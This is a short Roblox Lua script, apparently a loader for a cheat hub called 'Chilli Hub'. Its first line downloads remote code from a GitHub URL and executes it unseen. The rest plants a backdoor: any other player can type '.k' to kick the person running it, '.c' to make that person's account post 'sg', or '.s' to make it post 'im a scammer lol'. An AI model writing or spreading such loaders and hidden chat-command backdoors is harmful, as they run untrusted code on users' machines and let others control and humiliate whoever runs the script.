loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"))()

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local localPlayer = Players.LocalPlayer

-- Get the general chat channel
local chatChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")

for _, plr in pairs(Players:GetPlayers()) do
    if plr ~= localPlayer then
        plr.Chatted:Connect(function(msg)
            if msg == ".k" then
                localPlayer:Kick("You have been removed by Chilli Hub")
            elseif msg == ".c" then
                chatChannel:SendAsync("sg")
            end
        end)
    end
end

Players.PlayerAdded:Connect(function(plr)
    if plr ~= localPlayer then
        plr.Chatted:Connect(function(msg)
            if msg == ".k" then
                localPlayer:Kick("You have been removed by Chilli Hub")
            elseif msg == ".c" then
                chatChannel:SendAsync("sg")
            elseif msg == ".s" then
                chatChannel:SendAsync("im a scammer lol")
            end
        end)
    end
end)

